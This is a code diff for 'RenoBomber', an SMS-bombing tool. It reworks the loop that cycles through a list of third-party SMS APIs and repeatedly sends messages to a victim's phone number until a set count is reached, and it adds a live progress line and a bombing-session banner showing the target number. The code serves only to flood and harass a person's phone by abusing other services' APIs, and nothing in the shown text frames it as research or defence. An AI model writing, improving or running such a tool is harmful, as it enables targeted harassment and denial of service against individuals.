@@ -168,48 +168,67 @@ def send_bomb(phone,api,counter):
         
 
 
-def run_until_target(target,phone,pause_per_send=0.5,max_attempts=None):
-    "THIS IS RUN_UNTIL_TARGET IS FOR BOMB ONE BY ONE  "
+def run_until_target(target, phone, pause_per_send=0.5, max_attempts=None):
+    """
+    THIS IS run_until_target IS FOR BOMB ONE BY ONE
+    Attempts sending until `successes` reaches `target` or attempts reaches `max_attempts`.
+    Prints a single-line live update (overwrites same line).
+    """
     successes = 0
     attempts = 0
     failures = 0
-    i = 0 
-
+    i = 0
 
     if max_attempts is None:
-        max_attempts=target*4
+        max_attempts = target * 4
 
-    while successes < target and attempts < max_attempts :
-        try:
-            if not os.path.exists("apidata.json"):
-                print("apidata.json file not found.")
-                return
+    # load apis once (safer & faster)
+    if not os.path.exists("apidata.json"):
+        print(Fore.RED + "[!] apidata.json file not found.")
+        return
 
-            with open("apidata.json", "r") as file:
-               apis = json.load(file)
-        except Exception as e:
-            print(f"[*] Something went wrong as {e}")
+    try:
+        with open("apidata.json", "r") as file:
+            apis = json.load(file)
+    except Exception as e:
+        print(Fore.RED + f"[*] Failed to read apidata.json: {e}")
+        return
 
+    if not isinstance(apis, list) or len(apis) == 0:
+        print(Fore.RED + "[!] apidata.json must be a non-empty list of APIs.")
+        return
 
-        api = apis[i % len(apis)]  
+    # main loop
+    while successes < target and attempts < max_attempts:
+        api = apis[i % len(apis)]
         attempts += 1
 
-        ok=send_bomb(phone,api,attempts)
+        try:
+            ok = send_bomb(phone, api, attempts)  
+        except Exception as e:
+            ok = False
+           
 
         if ok:
             successes += 1
-            print(Fore.GREEN + Style.BRIGHT + f"✅ [Attempt {attempts}] SMS Sent! ({successes}/{target} successful)")
         else:
             failures += 1
-            print(Fore.RED + Style.BRIGHT + f"❌ [Attempt {attempts}] SMS Failed! (Failures: {failures})")
 
-      
+        
+        print(
+            Fore.GREEN + Style.BRIGHT +
+            f"✅ Success: {successes}/{target} | "
+            + Fore.RED + f"❌ Failures: {failures} | "
+            + Fore.YELLOW + f"Attempts: {attempts}",
+            end="\r", flush=True
+        )
+
         i += 1
         time.sleep(pause_per_send)
 
 
         if successes >= target:
-            print(Fore.CYAN + Style.BRIGHT + "\n" + "="*60)
+            print(Fore.CYAN + Style.BRIGHT + "\n\n" + "="*60)
             print(Fore.YELLOW + Style.BRIGHT + "RenoBomber Dashboard")
             print(Fore.CYAN + Style.BRIGHT + "="*60)
             print(Fore.GREEN + Style.BRIGHT + f"✔ Total Successes : {successes}")
@@ -252,7 +271,15 @@ def sms_bomb():
         bann_text_mrrenox() 
         print(Fore.MAGENTA + Style.BRIGHT + "Setup is Ready starting for bombing ... Initializing RenoBomber Module...\n")
         loading_animation(duration=10)
+
+        print(Fore.WHITE + Style.BRIGHT + "================= BOMBAING SESSION STARTED =================")
+        print(Fore.WHITE + Style.BRIGHT + "API Version   : " + Fore.GREEN + "1.0")
+        print(Fore.WHITE + Style.BRIGHT + "Target Number : " + Fore.GREEN + f"{victim_number}")
+        print(Fore.WHITE + Style.BRIGHT + "Total Messages: " + Fore.GREEN + f"{target}")
+        print(Fore.WHITE + Style.BRIGHT + "Delay (s)     : " + Fore.GREEN + f"{time_delay}")
+        print(Fore.WHITE + Style.BRIGHT + "Bombing Stop  : " + Fore.GREEN + "Ctrl+Z")
         run_until_target(target,victim_number,time_delay)
+
     
     except KeyboardInterrupt:
         print(Fore.RED + Style.BRIGHT + "\n[ ! ] Bombing manually stopped by user.") 
